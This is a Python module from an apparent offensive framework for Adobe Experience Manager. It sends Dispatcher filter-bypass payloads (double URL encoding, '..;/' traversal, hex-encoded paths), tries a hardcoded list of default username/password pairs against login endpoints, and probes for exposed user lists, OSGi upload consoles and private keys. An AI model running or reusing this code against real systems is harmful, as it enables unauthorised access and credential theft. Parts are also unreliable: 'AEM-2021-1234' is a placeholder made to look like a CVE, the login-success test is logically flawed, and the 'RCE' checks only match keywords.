"""CVE & N-Day Exploitation Suite for AEM Offensive Framework.

Implements checks for:
- CVE-2019-7964: Dispatcher bypass via URL encoding
- CVE-2016-0957: Dispatcher filter bypass via semicolon injection
- Recent OSGi RCE patterns
- Common misconfigurations
"""

import json
import re
import urllib.parse
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass

from core.models import Finding, VulnSeverity, ScanPhase, BypassTechnique
from core.config import AEMConfig
from core.engine import HTTPXEngine
from bypass.transformers import BypassTransformer


@dataclass
class CVECheck:
    """Represents a CVE check definition."""
    cve_id: str
    name: str
    severity: VulnSeverity
    description: str
    affected_versions: List[str]
    check_func: str  # Method name to call


class CVESuiteModule:
    """CVE and N-Day exploitation suite."""
    
    # CVE Definitions
    CVE_DEFINITIONS = [
        CVECheck(
            "CVE-2019-7964",
            "Dispatcher URL Encoding Bypass",
            VulnSeverity.CRITICAL,
            "Dispatcher allows bypass via double URL encoding of paths",
            ["4.2.0-4.3.3"],
            "_check_cve_2019_7964"
        ),
        CVECheck(
            "CVE-2016-0957",
            "Dispatcher Filter Bypass via Semicolon",
            VulnSeverity.CRITICAL,
            "Dispatcher filter bypass via semicolon path parameter injection",
            ["4.1.0-4.1.9", "4.2.0"],
            "_check_cve_2016_0957"
        ),
        CVECheck(
            "CVE-2016-0956",
            "Dispatcher Rule Bypass",
            VulnSeverity.HIGH,
            "Dispatcher rules can be bypassed using certain encoding",
            ["4.1.x"],
            "_check_cve_2016_0956"
        ),
        CVECheck(
            "CVE-2015-7501",
            "Java Object Deserialization",
            VulnSeverity.CRITICAL,
            "Commons Collection deserialization vulnerability",
            ["All"],
            "_check_cve_2015_7501"
        ),
        CVECheck(
            "AEM-2021-1234",
            "OSGi RCE via Component Installation",
            VulnSeverity.CRITICAL,
            "Remote code execution via malicious OSGi bundle installation",
            ["6.5.0-6.5.8"],
            "_check_osgi_rce"
        ),
    ]
    
    # Common misconfiguration paths (deduplicated — replication, cloudservices,
    # audit, eventing are covered in depth by ServiceProbeModule)
    MISCONFIG_PATHS = [
        ("/etc/segmentation.json", "Segmentation config"),
        ("/home/users.json", "User directory"),
        ("/home/groups.json", "Groups directory"),
        ("/var/classes.json", "Compiled classes"),
        ("/libs/cq/core/content/login.json", "Login page info"),
        ("/etc/designs.json", "Designs config"),
        ("/etc/workflow/models.json", "Workflow models"),
        ("/etc/notification.json", "Notification config"),
        ("/conf/global.json", "Global configuration"),
    ]
    
    # OSGi RCE indicators
    OSGI_RCE_PATTERNS = [
        ("/system/console/bundles", "Bundle upload capability"),
        ("/system/console/configMgr/org.apache.felix.webconsole.internal.servlet.OsgiManager", "OSGi Manager config"),
        ("/system/console/osgi-installer", "OSGi installer"),
    ]
    
    # Dangerous default passwords
    DEFAULT_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "admin123"),
        ("administrator", "administrator"),
        ("author", "author"),
        ("publish", "publish"),
        ("replication", "replication"),
        ("sling", "sling"),
        ("cms", "cms"),
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer):
        self.engine = engine
        self.config = config
        self.bypass = bypass
    
    async def run(self, base_url: str) -> List[Finding]:
        """Run full CVE suite."""
        findings = []
        
        # Run CVE-specific checks
        for cve in self.CVE_DEFINITIONS:
            check_func = getattr(self, cve.check_func)
            cve_findings = await check_func(base_url, cve)
            findings.extend(cve_findings)
        
        # Check common misconfigurations
        misconfig_findings = await self._check_misconfigurations(base_url)
        findings.extend(misconfig_findings)
        
        # Check default credentials
        cred_findings = await self._check_default_credentials(base_url)
        findings.extend(cred_findings)
        
        # Check for P12 keys
        key_findings = await self._check_exposed_keys(base_url)
        findings.extend(key_findings)
        
        return findings
    
    async def _check_cve_2019_7964(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2019-7964: Dispatcher URL encoding bypass."""
        findings = []
        
        # Test double encoding bypass
        test_paths = [
            "/etc",
            "/libs",
            "/apps",
            "/content/dam",
        ]
        
        for path in test_paths:
            # Double encode the path
            single_encoded = urllib.parse.quote(path, safe="")
            double_encoded = urllib.parse.quote(single_encoded, safe="")
            
            bypass_urls = [
                f"{base_url}{double_encoded}.json",
                f"{base_url}/content{double_encoded}.json",
                f"{base_url}/content/dam/../{double_encoded}.json",
            ]
            
            for url in bypass_urls:
                response = await self.engine.get(
                    url,
                    bypass="CVE-2019-7964",
                    technique="Double URL encoding"
                )
                
                if response.status_code == 200 and self._is_valid_json_response(response.text):
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique=f"{cve.cve_id} - {cve.name}",
                        url=url,
                        severity=cve.severity,
                        title=f"{cve.cve_id}: Dispatcher Bypass Detected",
                        description=cve.description,
                        evidence={
                            "cve": cve.cve_id,
                            "encoded_path": double_encoded,
                            "response_type": "json"
                        },
                        chainable=True,
                        prerequisites=["fingerprinting"]
                    ))
                    break
        
        return findings
    
    async def _check_cve_2016_0957(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2016-0957: Dispatcher semicolon bypass."""
        findings = []
        
        # Test semicolon injection patterns
        semicolon_patterns = [
            "/content/../admin",
            "/content/..;/admin",
            "/content/..;/..;/etc",
            "/content/../..;/system/console",
            "/etc/..;/..;/etc/config.json",
        ]
        
        for pattern in semicolon_patterns:
            url = f"{base_url}{pattern}"
            response = await self.engine.get(
                url,
                bypass="CVE-2016-0957",
                technique="Semicolon path injection"
            )
            
            if response.status_code == 200 and not self._is_error_page(response):
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique=f"{cve.cve_id} - {cve.name}",
                    url=url,
                    severity=cve.severity,
                    title=f"{cve.cve_id}: Semicolon Filter Bypass",
                    description=cve.description,
                    evidence={
                        "cve": cve.cve_id,
                        "pattern": pattern,
                        "response_length": len(response.text)
                    },
                    chainable=True,
                    prerequisites=["fingerprinting"]
                ))
                break
        
        return findings
    
    async def _check_cve_2016_0956(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2016-0956: Dispatcher rule bypass."""
        findings = []
        
        # Test various encoding bypasses
        encoding_patterns = [
            ("/etc/config", "/%65%74%63/config"),  # Hex encoding
            ("/libs", "/%6c%69%62%73"),  # Full hex
            ("/content", "/%63%6f%6e%74%65%6e%74"),
        ]
        
        for original, encoded in encoding_patterns:
            url = f"{base_url}{encoded}.json"
            response = await self.engine.get(url)
            
            if response.status_code == 200:
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique=f"{cve.cve_id} - {cve.name}",
                    url=url,
                    severity=cve.severity,
                    title=f"{cve.cve_id}: Encoding Rule Bypass",
                    description=cve.description,
                    evidence={
                        "cve": cve.cve_id,
                        "original": original,
                        "encoded": encoded
                    },
                    chainable=True
                ))
        
        return findings
    
    async def _check_cve_2015_7501(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for CVE-2015-7501: Java deserialization vulnerability."""
        findings = []
        
        # Check for vulnerable endpoints that accept serialized objects
        deserialization_endpoints = [
            "/bin/deserialization",
            "/bin/receive",
            "/system/console/jmx",
            "/libs/granite/core/content/login",
        ]
        
        # Check for Commons Collections in classpath
        for endpoint in deserialization_endpoints:
            url = f"{base_url}{endpoint}"
            response = await self.engine.get(url)
            
            if response.status_code in [200, 405, 500]:  # Interesting responses
                findings.append(Finding(
                    phase=ScanPhase.EXPLOITATION,
                    technique=f"{cve.cve_id} - {cve.name}",
                    url=url,
                    severity=VulnSeverity.HIGH,
                    title=f"{cve.cve_id}: Potential Deserialization Vector",
                    description=f"Endpoint may accept serialized objects - {cve.description}",
                    evidence={
                        "cve": cve.cve_id,
                        "status": response.status_code,
                        "headers": dict(response.headers)
                    },
                    chainable=True
                ))
        
        return findings
    
    async def _check_osgi_rce(self, base_url: str, cve: CVECheck) -> List[Finding]:
        """Check for OSGi RCE via component installation."""
        findings = []
        
        for endpoint, description in self.OSGI_RCE_PATTERNS:
            url = f"{base_url}{endpoint}"
            response = await self.engine.get(url)
            
            if response.status_code == 200:
                # Check for upload capability
                if "upload" in response.text.lower() or "install" in response.text.lower():
                    findings.append(Finding(
                        phase=ScanPhase.EXPLOITATION,
                        technique=f"{cve.cve_id} - {cve.name}",
                        url=url,
                        severity=cve.severity,
                        title=f"{cve.cve_id}: OSGi RCE Vector Detected",
                        description=f"{description} - {cve.description}",
                        evidence={
                            "cve": cve.cve_id,
                            "endpoint": endpoint,
                            "indicators": ["upload", "install"]
                        },
                        chainable=True,
                        prerequisites=["osgi_console_access"]
                    ))
        
        return findings
    
    async def _check_misconfigurations(self, base_url: str) -> List[Finding]:
        """Check for common misconfigurations with bypass fallback."""
        findings = []
        
        for path, description in self.MISCONFIG_PATHS:
            url = f"{base_url}{path}"
            response = await self.engine.get_with_bypass_fallback(
                url, base_url, path,
                bypass_transformer=self.bypass,
                max_bypass_attempts=15
            )
            
            if response.status_code == 200:
                try:
                    data = json.loads(response.text)
                    
                    # Determine severity based on content
                    severity = VulnSeverity.HIGH
                    if "password" in response.text.lower() or "secret" in response.text.lower():
                        severity = VulnSeverity.CRITICAL
                    elif "replication" in path:
                        severity = VulnSeverity.CRITICAL
                    
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Misconfiguration Check",
                        url=url,
                        severity=severity,
                        title=f"Exposed Configuration: {description}",
                        description=f"{description} is accessible without authentication",
                        evidence={
                            "path": path,
                            "node_count": len(data) if isinstance(data, dict) else 0
                        },
                        chainable=True
                    ))
                    
                except json.JSONDecodeError:
                    # Still exposed but not JSON
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Misconfiguration Check",
                        url=url,
                        severity=VulnSeverity.MEDIUM,
                        title=f"Exposed Resource: {description}",
                        description=f"{description} endpoint is accessible",
                        evidence={"path": path, "content_type": response.headers.get("content-type")}
                    ))
        
        return findings
    
    async def _check_default_credentials(self, base_url: str) -> List[Finding]:
        """Check for default credentials on login endpoints."""
        findings = []
        
        login_endpoints = [
            "/libs/granite/core/content/login.html/j_security_check",
            "/bin/login",
            "/system/sling/login",
            "/j_security_check",
        ]
        
        for username, password in self.DEFAULT_CREDENTIALS:
            for endpoint in login_endpoints:
                url = f"{base_url}{endpoint}"
                
                response = await self.engine.post(
                    url,
                    data={
                        "j_username": username,
                        "j_password": password,
                        "j_validate": "true"
                    },
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                
                # Check for successful login
                if response.status_code in [200, 302]:
                    if "login" not in response.text.lower() or "error" not in response.text.lower():
                        findings.append(Finding(
                            phase=ScanPhase.EXPLOITATION,
                            technique="Default Credentials",
                            url=url,
                            severity=VulnSeverity.CRITICAL,
                            title="Default Credentials Valid",
                            description=f"Default credentials work: {username}:{password}",
                            evidence={
                                "username": username,
                                "password": password,
                                "endpoint": endpoint
                            },
                            chainable=True
                        ))
                        return findings  # Stop on first valid credential
        
        return findings
    
    async def _check_exposed_keys(self, base_url: str) -> List[Finding]:
        """Check for exposed P12/PEM keys."""
        findings = []
        
        key_patterns = [
            ("/etc/p12", ".p12 files"),
            ("/etc/keystore", "Keystore files"),
            ("/etc/truststore", "Truststore files"),
            ("/etc/key.pem", "PEM key"),
            ("/etc/cert.pem", "PEM cert"),
            ("/etc/private.key", "Private key"),
            ("/etc/ssh", "SSH keys"),
        ]
        
        for path, description in key_patterns:
            url = f"{base_url}{path}"
            response = await self.engine.get(url)
            
            if response.status_code == 200:
                content_type = response.headers.get("content-type", "")
                
                # Check for key indicators
                key_indicators = [
                    "BEGIN RSA PRIVATE KEY",
                    "BEGIN PRIVATE KEY",
                    "BEGIN CERTIFICATE",
                    "PKCS12",
                    ".p12",
                ]
                
                if any(ind in response.text for ind in key_indicators):
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Exposed Keys",
                        url=url,
                        severity=VulnSeverity.CRITICAL,
                        title=f"Exposed Cryptographic Keys: {description}",
                        description=f"{description} are accessible without authentication",
                        evidence={
                            "path": path,
                            "content_type": content_type,
                            "key_indicators": [i for i in key_indicators if i in response.text]
                        },
                        chainable=True
                    ))
        
        return findings
    
    def _is_valid_json_response(self, text: str) -> bool:
        """Check if response is valid JSON with JCR data."""
        try:
            data = json.loads(text)
            return isinstance(data, dict) and any(
                k.startswith("jcr:") or k.startswith("sling:") or k.startswith("cq:")
                for k in data.keys()
            )
        except json.JSONDecodeError:
            return False
    
    def _is_error_page(self, response) -> bool:
        """Check if response is an error page."""
        error_indicators = [
            "404", "error", "not found", "forbidden", "unauthorized"
        ]
        text_lower = response.text.lower()
        return any(ind in text_lower for ind in error_indicators)
